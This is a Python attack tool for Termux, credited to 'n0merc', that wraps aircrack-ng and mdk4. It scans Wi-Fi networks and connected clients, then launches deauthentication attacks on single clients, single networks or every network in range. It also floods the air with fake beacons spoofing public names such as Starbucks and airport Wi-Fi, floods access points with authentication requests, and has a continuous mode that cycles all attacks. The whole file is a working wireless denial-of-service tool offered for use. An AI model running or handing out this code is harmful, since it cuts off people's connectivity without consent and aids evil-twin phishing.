#!/usr/bin/env python3
import subprocess
import time
import threading
import os
import sys
import re
import json
from datetime import datetime

class WiFiDeauthAttacker:
    def __init__(self):
        self.running = False
        self.attack_threads = []
        self.monitor_mode = False
        self.interface = None
        self.targets = []
        
    def check_root(self):
        """Check if we have root, you need this shit"""
        if os.geteuid() != 0:
            print("[!] NO ROOT ACCESS - This tool requires root!")
            print("[!] Run with: tsu -c 'python3 wifi_deauth.py'")
            return False
        return True
    
    def find_wifi_interfaces(self):
        """Find available WiFi interfaces"""
        interfaces = []
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            lines = result.stdout.split('\n')
            
            for line in lines:
                if 'IEEE 802.11' in line:
                    iface = line.split()[0]
                    interfaces.append(iface)
            
            # Also check via ip
            result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'wlan' in line or 'wlp' in line:
                    parts = line.split(':')
                    if len(parts) > 1:
                        iface = parts[1].strip()
                        if iface not in interfaces:
                            interfaces.append(iface)
            
        except Exception as e:
            print(f"[-] Error finding interfaces: {e}")
        
        return interfaces
    
    def check_monitor_support(self, interface):
        """Check if interface supports monitor mode"""
        try:
            result = subprocess.run(['iw', interface, 'info'], capture_output=True, text=True)
            if 'monitor' in result.stdout.lower():
                return True
        except:
            pass
        return False
    
    def enable_monitor_mode(self, interface):
        """Put interface in monitor mode"""
        print(f"[*] Enabling monitor mode on {interface}")
        
        try:
            # Bring interface down
            subprocess.run(['ip', 'link', 'set', interface, 'down'], check=True)
            
            # Set monitor mode
            subprocess.run(['iw', 'dev', interface, 'set', 'type', 'monitor'], check=True)
            
            # Bring interface up
            subprocess.run(['ip', 'link', 'set', interface, 'up'], check=True)
            
            # Check if monitor mode enabled
            result = subprocess.run(['iwconfig', interface], capture_output=True, text=True)
            if 'Mode:Monitor' in result.stdout:
                print(f"[+] Monitor mode enabled on {interface}")
                self.monitor_mode = True
                self.interface = interface
                return True
            else:
                print(f"[-] Failed to enable monitor mode on {interface}")
                return False
                
        except Exception as e:
            print(f"[-] Error enabling monitor mode: {e}")
            return False
    
    def scan_networks(self, interface, duration=10):
        """Scan for WiFi networks"""
        print(f"[*] Scanning for networks (duration: {duration}s)...")
        
        networks = []
        
        try:
            # Use airodump-ng for scanning
            cmd = ['timeout', str(duration), 'airodump-ng', '--write', '/tmp/scan', '--output-format', 'csv', interface]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            # Parse airodump output
            scan_file = '/tmp/scan-01.csv'
            if os.path.exists(scan_file):
                with open(scan_file, 'r') as f:
                    lines = f.readlines()
                
                # Find where networks start
                start_idx = 0
                for i, line in enumerate(lines):
                    if 'BSSID' in line and 'Channel' in line:
                        start_idx = i + 1
                        break
                
                # Parse networks
                for line in lines[start_idx:]:
                    if line.strip() == '':
                        break
                    
                    parts = line.strip().split(',')
                    if len(parts) >= 14:
                        bssid = parts[0].strip()
                        channel = parts[3].strip()
                        speed = parts[4].strip()
                        encryption = parts[5].strip()
                        essid = parts[13].strip()
                        
                        if bssid and bssid != '00:00:00:00:00:00':
                            networks.append({
                                'bssid': bssid,
                                'essid': essid,
                                'channel': channel,
                                'encryption': encryption,
                                'speed': speed
                            })
            
            # Clean up
            if os.path.exists(scan_file):
                os.remove(scan_file)
                
        except Exception as e:
            print(f"[-] Error scanning: {e}")
            
            # Fallback to iwlist
            try:
                cmd = ['iwlist', interface, 'scan']
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=duration)
                
                current_bssid = None
                current_essid = None
                current_channel = None
                current_encryption = None
                
                for line in result.stdout.split('\n'):
                    line = line.strip()
                    
                    if 'Address:' in line:
                        if current_bssid:
                            networks.append({
                                'bssid': current_bssid,
                                'essid': current_essid or 'Hidden',
                                'channel': current_channel or '?',
                                'encryption': current_encryption or '?',
                                'speed': '?'
                            })
                        current_bssid = line.split('Address:')[1].strip()
                    
                    elif 'ESSID:' in line:
                        current_essid = line.split('ESSID:')[1].strip().strip('"')
                    
                    elif 'Channel:' in line:
                        current_channel = line.split('Channel:')[1].strip()
                    
                    elif 'Encryption key:' in line:
                        current_encryption = 'WPA2' if 'on' in line else 'Open'
                
                # Add last network
                if current_bssid:
                    networks.append({
                        'bssid': current_bssid,
                        'essid': current_essid or 'Hidden',
                        'channel': current_channel or '?',
                        'encryption': current_encryption or '?',
                        'speed': '?'
                    })
                    
            except Exception as e2:
                print(f"[-] Fallback scan also failed: {e2}")
        
        return networks
    
    def scan_clients(self, interface, bssid, channel, duration=15):
        """Scan for clients connected to a specific AP"""
        print(f"[*] Scanning for clients on {bssid} (channel {channel})...")
        
        clients = []
        
        try:
            # Set channel
            subprocess.run(['iwconfig', interface, 'channel', str(channel)], check=True)
            
            # Use airodump to capture clients
            cmd = [
                'timeout', str(duration),
                'airodump-ng',
                '--bssid', bssid,
                '--channel', str(channel),
                '--write', '/tmp/client_scan',
                '--output-format', 'csv',
                interface
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            # Parse client data
            scan_file = '/tmp/client_scan-01.csv'
            if os.path.exists(scan_file):
                with open(scan_file, 'r') as f:
                    lines = f.readlines()
                
                # Find where clients start (after network section)
                in_clients = False
                for line in lines:
                    if 'Station MAC' in line:
                        in_clients = True
                        continue
                    
                    if in_clients and line.strip():
                        parts = line.strip().split(',')
                        if len(parts) >= 6:
                            client_mac = parts[0].strip()
                            if client_mac and client_mac != '00:00:00:00:00:00':
                                clients.append(client_mac)
                
                # Clean up
                os.remove(scan_file)
                
        except Exception as e:
            print(f"[-] Error scanning clients: {e}")
        
        return clients
    
    def deauth_attack(self, interface, bssid, client_mac=None, count=0, interval=100):
        """Perform deauthentication attack"""
        print(f"[*] Starting deauth attack on {bssid}")
        if client_mac:
            print(f"[*] Targeting client: {client_mac}")
        
        deauth_count = 0
        
        while self.running and (count == 0 or deauth_count < count):
            try:
                # Build aireplay-ng command
                cmd = ['aireplay-ng', '--deauth', str(interval), '-a', bssid]
                
                if client_mac:
                    cmd.extend(['-c', client_mac])
                
                cmd.append(interface)
                
                # Run deauth attack
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=interval/1000 + 2)
                
                # Parse output for success
                if 'DeAuth' in result.stdout or 'sent' in result.stdout.lower():
                    deauth_count += interval
                    timestamp = datetime.now().strftime("%H:%M:%S")
                    
                    if client_mac:
                        print(f"[{timestamp}] Deauth sent to {client_mac} via {bssid}")
                    else:
                        print(f"[{timestamp}] Broadcast deauth sent to {bssid}")
                
                # Small delay between bursts
                time.sleep(0.1)
                
            except subprocess.TimeoutExpired:
                # Expected - aireplay runs for the interval duration
                pass
            except Exception as e:
                print(f"[-] Deauth error: {e}")
                time.sleep(1)
        
        print(f"[+] Deauth attack completed. Sent approximately {deauth_count} packets")
    
    def beacon_flood_attack(self, interface, count=1000):
        """Flood with fake AP beacons"""
        print(f"[*] Starting beacon flood attack")
        
        # Common ESSIDs to spoof
        common_essids = [
            "Free WiFi", "Starbucks", "Airport WiFi", "Hotel Guest",
            "McDonald's Free WiFi", "ATT WiFi", "xfinitywifi",
            "AndroidAP", "iPhone", "Linksys", "NETGEAR",
            "TP-LINK", "D-Link", "Belkin", "Google Starbucks"
        ]
        
        essid_index = 0
        packet_count = 0
        
        while self.running and packet_count < count:
            try:
                # Generate random BSSID
                bssid = ':'.join([f"{random.randint(0x00, 0xff):02x}" for _ in range(6)])
                
                # Get ESSID
                essid = common_essids[essid_index % len(common_essids)]
                essid_index += 1
                
                # Generate random channel
                channel = random.choice([1, 6, 11])
                
                # Create mdk4 command for beacon flood
                # Note: mdk4 needs to be installed separately
                cmd = [
                    'echo', f'{bssid} {essid} {channel}',
                    '|', 'mdk4', interface, 'b', '-n', essid, '-c', str(channel)
                ]
                
                subprocess.run(' '.join(cmd), shell=True, timeout=1, capture_output=True)
                
                packet_count += 1
                if packet_count % 100 == 0:
                    print(f"[+] Sent {packet_count} beacon frames")
                
            except Exception as e:
                # mdk4 might not be available, try alternative
                print(f"[-] Beacon flood error: {e}")
                break
        
        print(f"[+] Beacon flood completed")
    
    def auth_flood_attack(self, interface, bssid):
        """Flood AP with authentication requests"""
        print(f"[*] Starting authentication flood on {bssid}")
        
        packet_count = 0
        
        while self.running:
            try:
                # Generate random client MAC
                client_mac = ':'.join([f"{random.randint(0x00, 0xff):02x}" for _ in range(6)])
                
                # Send authentication request
                cmd = [
                    'aireplay-ng', '--fakeauth', '1',
                    '-a', bssid,
                    '-h', client_mac,
                    interface
                ]
                
                subprocess.run(cmd, timeout=2, capture_output=True)
                
                packet_count += 1
                if packet_count % 10 == 0:
                    print(f"[+] Sent {packet_count} auth requests to {bssid}")
                
                time.sleep(0.1)
                
            except Exception as e:
                print(f"[-] Auth flood error: {e}")
                time.sleep(1)
    
    def start_attack(self, attack_type, targets, interface=None, channel=None, client=None):
        """Start the selected attack"""
        if not self.check_root():
            return False
        
        # Find interface if not specified
        if not interface:
            interfaces = self.find_wifi_interfaces()
            if not interfaces:
                print("[-] No WiFi interfaces found!")
                return False
            
            interface = interfaces[0]
            print(f"[+] Using interface: {interface}")
        
        # Enable monitor mode
        if not self.enable_monitor_mode(interface):
            print("[-] Could not enable monitor mode!")
            print("[!] Try a different interface or check driver support")
            return False
        
        self.running = True
        
        # Start attacks based on type
        if attack_type == 'deauth':
            for target in targets:
                bssid = target.get('bssid')
                clients = target.get('clients', [])
                
                if not bssid:
                    continue
                
                # Set channel if provided
                if channel:
                    subprocess.run(['iwconfig', interface, 'channel', str(channel)])
                
                # Attack all clients or broadcast
                if clients:
                    for client_mac in clients:
                        t = threading.Thread(target=self.deauth_attack, 
                                           args=(interface, bssid, client_mac, 0, 100))
                        t.daemon = True
                        t.start()
                        self.attack_threads.append(t)
                else:
                    t = threading.Thread(target=self.deauth_attack,
                                       args=(interface, bssid, None, 0, 100))
                    t.daemon = True
                    t.start()
                    self.attack_threads.append(t)
        
        elif attack_type == 'beacon':
            t = threading.Thread(target=self.beacon_flood_attack,
                               args=(interface, 10000))
            t.daemon = True
            t.start()
            self.attack_threads.append(t)
        
        elif attack_type == 'auth':
            for target in targets:
                bssid = target.get('bssid')
                if bssid:
                    t = threading.Thread(target=self.auth_flood_attack,
                                       args=(interface, bssid))
                    t.daemon = True
                    t.start()
                    self.attack_threads.append(t)
        
        print(f"\n[+] {attack_type.upper()} attack started!")
        print("[+] Press Ctrl+C to stop all attacks")
        
        # Keep main thread alive
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop_attack()
    
    def stop_attack(self):
        """Stop all attacks and clean up"""
        self.running = False
        
        for t in self.attack_threads:
            t.join(timeout=2.0)
        
        # Disable monitor mode if enabled
        if self.monitor_mode and self.interface:
            try:
                subprocess.run(['ip', 'link', 'set', self.interface, 'down'])
                subprocess.run(['iw', 'dev', self.interface, 'set', 'type', 'managed'])
                subprocess.run(['ip', 'link', 'set', self.interface, 'up'])
                print(f"[+] Monitor mode disabled on {self.interface}")
            except:
                pass
        
        print("\n[+] All attacks stopped")

def main():
    # Check for required tools
    required_tools = ['iwconfig', 'iw', 'aireplay-ng', 'airodump-ng']
    missing_tools = []
    
    for tool in required_tools:
        try:
            subprocess.run([tool, '--help'], capture_output=True, timeout=1)
        except:
            missing_tools.append(tool)
    
    if missing_tools:
        print(f"[!] Missing tools: {', '.join(missing_tools)}")
        print("[!] Install with: pkg install aircrack-ng wireless-tools")
        response = input("[?] Continue anyway? (y/n): ").lower()
        if response != 'y':
            return
    
    attacker = WiFiDeauthAttacker()
    
    print("""
    ╔══════════════════════════════════════════╗
    ║      WI-FI DEAUTHENTICATION ATTACK       ║
    ║              TERMUX EDITION              ║
    ║               by n0merc                  ║
    ╚══════════════════════════════════════════╝
    """)
    
    # Check root
    if not attacker.check_root():
        print("[!] This tool requires root privileges!")
        print("[!] Run with: tsu -c 'python3 wifi_deauth.py'")
        return
    
    # Find interfaces
    interfaces = attacker.find_wifi_interfaces()
    if not interfaces:
        print("[-] No WiFi interfaces found!")
        print("[!] Make sure your device has WiFi capability")
        return
    
    print(f"[+] Available interfaces: {', '.join(interfaces)}")
     # Select interface
    if len(interfaces) > 1:
        print("\n[?] Select WiFi interface:")
        for i, iface in enumerate(interfaces, 1):
            print(f"  {i}. {iface}")
        choice = input("\n[>] Enter choice (1-{}): ".format(len(interfaces))).strip()
        try:
            interface = interfaces[int(choice) - 1]
        except:
            interface = interfaces[0]
    else:
        interface = interfaces[0]
    
    print(f"[+] Selected interface: {interface}")
    
    # Main menu
    while True:
        print("\n" + "="*50)
        print("[?] Select operation:")
        print("  1. Scan for networks")
        print("  2. Scan for clients on a network")
        print("  3. Start deauth attack")
        print("  4. Beacon flood attack")
        print("  5. Authentication flood attack")
        print("  6. Continuous attack mode")
        print("  7. Stop all attacks")
        print("  8. Exit")
        
        choice = input("\n[>] Enter choice (1-8): ").strip()
        
        if choice == '1':
            # Scan networks
            duration = input("[?] Scan duration (seconds, default 10): ").strip()
            duration = int(duration) if duration.isdigit() else 10
            
            networks = attacker.scan_networks(interface, duration)
            
            if networks:
                print(f"\n[+] Found {len(networks)} networks:")
                print("-" * 80)
                print(f"{'#':<3} {'BSSID':<18} {'ESSID':<20} {'Channel':<8} {'Encryption':<12}")
                print("-" * 80)
                
                for i, net in enumerate(networks, 1):
                    essid = net['essid'][:20] if len(net['essid']) > 20 else net['essid']
                    print(f"{i:<3} {net['bssid']:<18} {essid:<20} {net['channel']:<8} {net['encryption']:<12}")
                
                # Save to file
                with open('/sdcard/wifi_networks.txt', 'w') as f:
                    for net in networks:
                        f.write(f"{net['bssid']},{net['essid']},{net['channel']},{net['encryption']}\n")
                print(f"\n[+] Network list saved to /sdcard/wifi_networks.txt")
                
                attacker.targets = networks  # Save for later use
            else:
                print("[-] No networks found!")
        
        elif choice == '2':
            # Scan for clients
            if not attacker.targets:
                print("[-] No targets available. Scan networks first.")
                continue
            
            print("\n[?] Select network to scan for clients:")
            for i, net in enumerate(attacker.targets, 1):
                essid = net['essid'][:20] if len(net['essid']) > 20 else net['essid']
                print(f"  {i}. {essid} ({net['bssid']})")
            
            net_choice = input("\n[>] Enter network number: ").strip()
            try:
                target_net = attacker.targets[int(net_choice) - 1]
                bssid = target_net['bssid']
                channel = target_net['channel']
                
                if channel == '?':
                    channel = input("[?] Enter channel number: ").strip()
                    if not channel.isdigit():
                        print("[-] Invalid channel!")
                        continue
                
                duration = input("[?] Scan duration (seconds, default 15): ").strip()
                duration = int(duration) if duration.isdigit() else 15
                
                clients = attacker.scan_clients(interface, bssid, channel, duration)
                
                if clients:
                    print(f"\n[+] Found {len(clients)} clients on {bssid}:")
                    for i, client in enumerate(clients, 1):
                        print(f"  {i}. {client}")
                    
                    # Save clients to target network
                    target_net['clients'] = clients
                    print(f"\n[+] Clients saved to target {bssid}")
                else:
                    print("[-] No clients found!")
                    
            except:
                print("[-] Invalid selection!")
        
        elif choice == '3':
            # Deauth attack
            if not attacker.targets:
                print("[-] No targets available. Scan networks first.")
                continue
            
            print("\n[?] Select attack mode:")
            print("  1. Deauth specific network (broadcast)")
            print("  2. Deauth specific client")
            print("  3. Deauth all scanned networks")
            
            mode = input("\n[>] Enter mode (1-3): ").strip()
            
            if mode == '1':
                # Deauth specific network
                print("\n[?] Select network to attack:")
                for i, net in enumerate(attacker.targets, 1):
                    essid = net['essid'][:20] if len(net['essid']) > 20 else net['essid']
                    print(f"  {i}. {essid} ({net['bssid']})")
                
                net_choice = input("\n[>] Enter network number: ").strip()
                try:
                    target_net = attacker.targets[int(net_choice) - 1]
                    targets = [{'bssid': target_net['bssid'], 'clients': []}]
                    
                    packet_count = input("[?] Number of deauth packets (0 for continuous): ").strip()
                    packet_count = int(packet_count) if packet_count.isdigit() else 0
                    
                    print(f"\n[*] Starting deauth attack on {target_net['bssid']}")
                    attacker.start_attack('deauth', targets, interface)
                    
                except:
                    print("[-] Invalid selection!")
            
            elif mode == '2':
                # Deauth specific client
                print("\n[?] Select network with clients:")
                networks_with_clients = [net for net in attacker.targets if 'clients' in net]
                
                if not networks_with_clients:
                    print("[-] No networks with clients found. Scan for clients first.")
                    continue
                
                for i, net in enumerate(networks_with_clients, 1):
                    essid = net['essid'][:20] if len(net['essid']) > 20 else net['essid']
                    print(f"  {i}. {essid} ({len(net['clients'])} clients)")
                
                net_choice = input("\n[>] Enter network number: ").strip()
                try:
                    target_net = networks_with_clients[int(net_choice) - 1]
                    
                    print("\n[?] Select client to attack:")
                    for i, client in enumerate(target_net['clients'], 1):
                        print(f"  {i}. {client}")
                    
                    client_choice = input("\n[>] Enter client number: ").strip()
                    try:
                        client_mac = target_net['clients'][int(client_choice) - 1]
                        targets = [{'bssid': target_net['bssid'], 'clients': [client_mac]}]
                        
                        print(f"\n[*] Starting deauth attack on client {client_mac}")
                        attacker.start_attack('deauth', targets, interface)
                        
                    except:
                        print("[-] Invalid client selection!")
                        
                except:
                    print("[-] Invalid network selection!")
            
            elif mode == '3':
                # Deauth all networks
                targets = []
                for net in attacker.targets:
                    targets.append({'bssid': net['bssid'], 'clients': []})
                
                print(f"\n[*] Starting deauth attack on ALL {len(targets)} networks!")
                attacker.start_attack('deauth', targets, interface)
        
        elif choice == '4':
            # Beacon flood
            print("\n[*] Starting beacon flood attack")
            print("[!] This will create fake WiFi networks")
            
            count = input("[?] Number of beacon packets (default 10000): ").strip()
            count = int(count) if count.isdigit() else 10000
            
            targets = [{'bssid': '00:00:00:00:00:00'}]  # Dummy target
            attacker.start_attack('beacon', targets, interface)
        
        elif choice == '5':
            # Auth flood
            if not attacker.targets:
                print("[-] No targets available. Scan networks first.")
                continue
            
            print("\n[?] Select network for auth flood:")
            for i, net in enumerate(attacker.targets, 1):
                essid = net['essid'][:20] if len(net['essid']) > 20 else net['essid']
                print(f"  {i}. {essid} ({net['bssid']})")
            
            net_choice = input("\n[>] Enter network number: ").strip()
            try:
                target_net = attacker.targets[int(net_choice) - 1]
                targets = [{'bssid': target_net['bssid']}]
                
                print(f"\n[*] Starting auth flood on {target_net['bssid']}")
                attacker.start_attack('auth', targets, interface)
                
            except:
                print("[-] Invalid selection!")
        
        elif choice == '6':
            # Continuous attack mode
            print("\n[*] Continuous Attack Mode")
            print("[!] This will cycle through all attacks")
            
            if not attacker.targets:
                print("[-] No targets available. Scan networks first.")
                continue
            
            # Create attack plan
            attack_plan = []
            for net in attacker.targets:
                attack_plan.append({
                    'type': 'deauth',
                    'target': {'bssid': net['bssid'], 'clients': []},
                    'duration': 30
                })
            
            # Add beacon flood
            attack_plan.append({
                'type': 'beacon',
                'target': {'bssid': '00:00:00:00:00:00'},
                'duration': 20
            })
            
            print(f"\n[*] Starting continuous attack with {len(attack_plan)} phases")
            
            attacker.running = True
            phase = 1
            
            while attacker.running and phase <= len(attack_plan):
                attack = attack_plan[phase - 1]
                print(f"\n[Phase {phase}/{len(attack_plan)}] {attack['type'].upper()} attack")
                
                if attack['type'] == 'deauth':
                    t = threading.Thread(target=attacker.deauth_attack,
                                       args=(interface, attack['target']['bssid'], None, 0, 100))
                    t.daemon = True
                    t.start()
                    attacker.attack_threads.append(t)
                    
                    time.sleep(attack['duration'])
                    
                elif attack['type'] == 'beacon':
                    t = threading.Thread(target=attacker.beacon_flood_attack,
                                       args=(interface, 5000))
                    t.daemon = True
                    t.start()
                    attacker.attack_threads.append(t)
                    
                    time.sleep(attack['duration'])
                
                # Stop current attack threads
                attacker.running = False
                for t in attacker.attack_threads:
                    t.join(timeout=1.0)
                attacker.attack_threads = []
                attacker.running = True
                
                phase += 1
            
            attacker.stop_attack()
            print("\n[+] Continuous attack completed")
        
        elif choice == '7':
            # Stop attacks
            attacker.stop_attack()
        
        elif choice == '8':
            # Exit
            attacker.stop_attack()
            print("\n[+] Exiting...")
            break
        
        else:
            print("[-] Invalid choice!")

if __name__ == "__main__":
    import random  # Import for beacon flood
    
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
    except Exception as e:
        print(f"\n[-] Error: {e}")
